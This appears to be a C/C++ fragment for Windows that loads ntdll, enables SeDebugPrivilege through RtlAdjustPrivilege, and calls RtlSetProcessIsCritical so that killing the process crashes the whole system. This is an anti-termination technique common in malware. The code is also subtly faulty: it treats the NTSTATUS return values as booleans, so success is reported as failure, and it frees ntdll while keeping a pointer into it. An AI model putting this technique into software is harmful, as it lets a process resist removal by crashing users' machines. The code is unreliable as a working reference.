typedef LONG (*pRtlSetProcessIsCritical)(BOOL,PBOOL,BOOL);
pRtlSetProcessIsCritical SetProcessIsCritical = NULL;
typedef LONG (*pRtlAdjustPrivilege)(int,BOOL,BOOL,int*);
pRtlAdjustPrivilege RtlAdjustPrivilege = NULL;

bool Import () {
	HANDLE hNTDLL = LoadLibraryA("ntdll.dll");
	if(!hNTDLL)
		return FALSE;
	SetProcessIsCritical = (pRtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hNTDLL,"RtlSetProcessIsCritical");
	RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress((HINSTANCE)hNTDLL,"RtlAdjustPrivilege");
	{
		int prtn;
		RtlAdjustPrivilege(20,TRUE,FALSE,&prtn);
	}
	RtlAdjustPrivilege = NULL;
	FreeLibrary(hNTDLL);
	return TRUE;
}

bool SetIsCritic(void){
	if(!SetProcessIsCritical(TRUE,NULL,FALSE) || !SetProcessShutdownParameters(0,0))
		return FALSE;
	return TRUE;
}

bool SetNotCritic(void){
       	if(!SetProcessIsCritical(FALSE,NULL,FALSE))
		return FALSE;
	return TRUE;
}
